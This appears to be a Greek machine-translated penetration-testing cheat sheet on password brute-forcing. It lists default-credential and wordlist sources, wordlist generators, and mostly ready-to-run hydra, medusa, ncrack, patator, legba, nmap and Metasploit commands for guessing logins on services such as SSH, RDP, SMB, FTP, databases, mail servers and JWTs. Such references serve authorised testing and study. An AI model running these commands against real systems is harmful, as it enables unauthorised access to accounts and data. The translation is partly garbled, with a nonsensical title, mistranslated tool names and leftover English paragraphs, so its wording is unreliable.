# Χειροκίνητη Δύναμη - Φύλλο Απατηλών Φύλλων

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Προεπιλεγμένα Διαπιστευτήρια

**Αναζητήστε στο Google** για τα προεπιλεγμένα διαπιστευτήρια της τεχνολογίας που χρησιμοποιείται, ή **δοκιμάστε αυτούς τους συνδέσμους**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Δημιουργία των Δικών σας Λεξικών**

Βρείτε όσο περισσότερες πληροφορίες μπορείτε για τον στόχο και δημιουργήστε ένα προσαρμοσμένο λεξικό. Εργαλεία που μπορεί να βοηθήσουν:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Κορυφαίος
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Δημιουργήστε κωδικούς πρόσβασης βασισμένους στη γνώση σας για το θύμα (ονόματα, ημερομηνίες...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Ένα εργαλείο για τη δημιουργία λίστας λέξεων, που σας επιτρέπει να παρέχετε ένα σύνολο λέξεων, δίνοντάς σας τη δυνατότητα να δημιουργήσετε πολλαπλές παραλλαγές από τις δοθείσες λέξεις, δημιουργώντας μια μοναδική και ιδανική λίστα λέξεων για χρήση σχετικά με ένα συγκεκριμένο στόχο.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Λίστες Λέξεων

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Υπηρεσίες

Ταξινομημένες κατά αλφαβητική σειρά ανά όνομα υπηρεσίας.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a binary protocol that can be used to communicate with a web server. It is often used to connect web servers with servlet containers, such as Apache Tomcat. A common attack vector against AJP is credential brute-forcing, where an attacker tries to guess usernames and passwords to gain unauthorized access to the server. It is important to use strong and unique credentials to prevent successful brute-force attacks.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Η Cassandra είναι μια βάση δεδομένων NoSQL που χρησιμοποιείται για τη διαχείριση μεγάλων όγκων δεδομένων με υψηλή διαθεσιμότητα και αντοχή σε αποτυχίες.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

Η επίθεση με βίαιη δύναμη είναι μια τεχνική που συχνά χρησιμοποιείται για να αποκτηθεί πρόσβαση σε συστήματα βάσεων δεδομένων, όπως το CouchDB. Κατά την επίθεση αυτή, ο εισβολέας δοκιμάζει συνεχώς διαφορετικά συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης μέχρι να βρει το σωστό. Εάν οι προεπιλεγμένες ρυθμίσεις ασφαλείας δεν είναι ενεργοποιημένες ή αν οι δημιουργοί χρησιμοποιούν αδύναμους κωδικούς πρόσβασης, η επίθεση με βίαιη δύναμη μπορεί να είναι επιτυχής.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Καταχώριση Docker
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

#### Brute Force

Η επίθεση Brute Force είναι μια τεχνική που συνίσταται στο να δοκιμάζει εναλλακτικές τιμές για ονόματα χρηστών και κωδικούς πρόσβασης μέχρι να βρεθούν τα σωστά στοιχεία πιστοποίησης. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να εξακολουθήσει να δοκιμάζει συνδυασμούς χρηστών/κωδικών πρόσβασης σε μια διεπαφή Elasticsearch μέχρι να επιτευχθεί επιτυχής πρόσβαση.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

Η επίθεση με βίαιη δύναμη (brute force) στο FTP συνήθως γίνεται με το λογισμικό Hydra. Το Hydra είναι ένα εργαλείο που χρησιμοποιεί λεξικά για να δοκιμάσει πολλούς συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης. Μπορείτε να το χρησιμοποιήσετε με την εντολή `hydra -l <username> -P <wordlist> <target> ftp`.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Γενική Εξαναγκαστική

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Βασική Ταυτοποίηση
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Αποστολή Φόρμας Post
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Για το http**s** πρέπει να αλλάξετε από "http-post-form" σε "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla ή (D)rupal ή (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

Η επίθεση Brute Force στον IMAP είναι μια τεχνική που χρησιμοποιείται για να αποκτήσει πρόσβαση σε λογαριασμούς email. Ο επιτιθέμενος χρησιμοποιεί λίστα με συνδυασμούς ονομάτων χρηστών και κωδικών πρόσβασης για να δοκιμάσει να συνδεθεί στον λογαριασμό IMAP.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

Το Internet Relay Chat (IRC) είναι ένα πρωτόκολλο επικοινωνίας σε πραγματικό χρόνο που χρησιμοποιείται για συνομιλίες σε ομάδες.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

Το JSON Web Token (JWT) είναι ένα ασφαλές τρόπος για τη μεταφορά πληροφοριών μεταξύ δύο συστημάτων.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

#### Επίθεση Brute Force

Η επίθεση Brute Force στο πρωτόκολλο MQTT περιλαμβάνει τη δοκιμή διαφορετικών συνδυασμών ονομάτων χρήστη και κωδικών πρόσβασης μέχρι να βρεθεί ο σωστός συνδυασμός που επιτρέπει την πρόσβαση σε έναν MQTT broker. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για την παράνομη πρόσβαση σε συστήματα MQTT και την παρακολούθηση της επικοινωνίας που λαμβάνει χώρα μέσω του broker.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

Η επίθεση με brute force στο MSSQL γίνεται συνήθως με τη χρήση εργαλείων όπως το Hydra, το Metasploit ή το Nmap. Μπορείτε επίσης να χρησιμοποιήσετε λειτουργίες όπως το SQLMap για αυτό το σκοπό.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

#### Brute Force

Brute force attacks against MySQL databases involve attempting to guess the username and password combinations to gain unauthorized access. This can be done using automated tools that systematically try all possible combinations until the correct one is found. It is important to use strong and unique credentials to protect against brute force attacks.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

Brute-force attacks against OracleSQL databases are typically carried out using tools such as Hydra or Metasploit. These tools allow attackers to systematically try all possible combinations of usernames and passwords until the correct one is found. It is important to note that brute-force attacks can be time-consuming and resource-intensive, so they should be used as a last resort after other, less intrusive methods have been exhausted.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Για να χρησιμοποιήσετε το **oracle\_login** με το **patator** χρειάζεστε να **εγκαταστήσετε**:
```bash
pip3 install cx_Oracle --upgrade
```
[Εκτός σύνδεσης OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**εκδόσεις 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** και **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

#### Επίθεση Βίας

Η επίθεση βίας είναι μια τεχνική που χρησιμοποιείται στον χώρο του υπολογιστικού hacking, όπου ο εισβολέας προσπαθεί να ανακαλύψει κωδικούς πρόσβασης ή κρυπτογραφημένα δεδομένα με τη δοκιμή όλων των πιθανών συνδυασμών.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

#### Βίαιη Δύναμη

Η βίαιη δύναμη είναι μια τεχνική επίθεσης που στοχεύει στο να βρει τα σωστά διαπιστευτήρια εισόδου με δοκιμές διαφόρων συνδυασμών χρησιμοποιώντας λίστες κωδικών ή γεννήτριες κωδικών. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε συστήματα βάσεων δεδομένων όπως το PostgreSQL.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Μπορείτε να κατεβάσετε το πακέτο `.deb` για εγκατάσταση από [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

### Εκτέλεση αναγκαστικής εισόδου (Brute Force)

Η τεχνική της εκτέλεσης αναγκαστικής εισόδου (Brute Force) αναφέρεται στη διαδικασία δοκιμής όλων των πιθανών συνδυασμών για να βρεθεί το σωστό συνθηματικό ή κλειδί πρόσβασης. Αυτή η μέθοδος είναι συχνά χρονοβόρα, αλλά μπορεί να είναι αποτελεσματική όταν δεν υπάρχουν άλλοι τρόποι πρόσβασης σε ένα σύστημα.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Η επίθεση Brute Force είναι μια από τις πιο δημοφιλείς τεχνικές επίθεσης εναντίον του πρωτοκόλλου Rlogin. Ο εισβολέας χρησιμοποιεί λίστα με πιθανά ονόματα χρηστών και κωδικούς πρόσβασης για να δοκιμάσει να εισέλθει στο σύστημα με τη μέθοδο της δοκιμής και σφάλματος.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Η επίθεση Brute Force είναι μια από τις πιο απλές μεθόδους επίθεσης. Στην ουσία, ο εισβολέας δοκιμάζει όλους τους πιθανούς συνδυασμούς χρησιμοποιώντας λίστα κωδικών πρόσβασης μέχρι να βρει τον σωστό. Αυτή η τεχνική μπορεί να είναι αποτελεσματική, αλλά μπορεί να απαιτήσει πολύ χρόνο, ειδικά αν ο κωδικός πρόσβασης είναι πολύπλοκος.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

### Υπηρεσία Ασφαλούς Μεταφοράς Αρχείων (SFTP)
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

Η ανάλυση SNMP είναι μια τεχνική επίθεσης που στοχεύει στην εξαγωγή πληροφοριών από συσκευές που υποστηρίζουν το πρωτόκολλο SNMP.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

#### Επίθεση Brute Force

Η επίθεση Brute Force είναι μια τεχνική που στοχεύει στην ανάγκη εισαγωγής όλων των πιθανών συνδυασμών κωδικών πρόσβασης μέχρι να βρεθεί ο σωστός κωδικός. Αυτή η τεχνική μπορεί να χρησιμοποιηθεί για να αποκτηθεί πρόσβαση σε συστήματα SMB.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

Η αποστολή μηνυμάτων ηλεκτρονικού ταχυδρομείου (email) μπορεί να γίνει μέσω του πρωτοκόλλου SMTP (Simple Mail Transfer Protocol).
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS (Socket Secure) είναι ένα πρωτόκολλο που χρησιμοποιείται για τη δρομολόγηση της κυκλοφορίας δεδομένων μεταξύ πελάτη και διακομιστή μέσω ένος διακομιστή proxy. Μπορεί να χρησιμοποιηθεί για να αποκρυψει την πραγματική διεύθυνση IP του πελάτη και να παρέχει ανωνυμία κατά την περιήγηση στο διαδίκτυο.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

Η επίθεση με βίαιη δύναμη είναι μια από τις πιο δημοφιλείς τεχνικές επίθεσης εναντίον των SQL Server. Οι επιτιθέμενοι χρησιμοποιούν λίστες με κοινά κωδικούς πρόσβασης ή λέξεις που χρησιμοποιούνται συχνά για να δοκιμάσουν την πρόσβαση σε λογαριασμούς χρηστών. Εάν ο SQL Server δεν έχει καλά ρυθμισμένες πολιτικές ασφαλείας, μια επίθεση με βίαιη δύναμη μπορεί να οδηγήσει σε παραβίαση του συστήματος.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH (Secure Shell) είναι ένα πρωτόκολλο δικτύου που χρησιμοποιείται για ασφαλή ανταλλαγή δεδομένων μεταξύ δύο συστημάτων.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Αδύναμα κλειδιά SSH / Προβλέψιμο PRNG του Debian

Κάποια συστήματα έχουν γνωστές ελαττώσεις στον τυχαίο σπόρο που χρησιμοποιείται για τη δημιουργία κρυπτογραφικού υλικού. Αυτό μπορεί να οδηγήσει σε μειωμένο χώρο κλειδιών που μπορεί να αποδοθεί με εργαλεία όπως το [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Επίσης, υπάρχουν προ-δημιουργημένα σύνολα αδύναμων κλειδιών όπως το [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ και OpenMQ)

Το πρωτόκολλο κειμένου STOMP είναι ένα ευρέως χρησιμοποιούμενο πρωτόκολλο μηνυμάτων που **επιτρέπει απρόσκοπτη επικοινωνία και αλληλεπίδραση με δημοφιλείς υπηρεσίες ουράς μηνυμάτων** όπως το RabbitMQ, το ActiveMQ, το HornetQ και το OpenMQ. Παρέχει μια τυποποιημένη και αποτελεσματική προσέγγιση για την ανταλλαγή μηνυμάτων και την εκτέλεση διάφορων λειτουργιών μηνυμάτων.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet είναι ένα πρωτόκολλο δικτύου που επιτρέπει στον χρήστη να συνδεθεί σε έναν απομακρυσμένο υπολογιστή ή συσκευή και να αλληλεπιδράσει μαζί του μέσω κοινών εντολών κειμένου.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

### VNC
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να κατασκευάσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Τοπικά

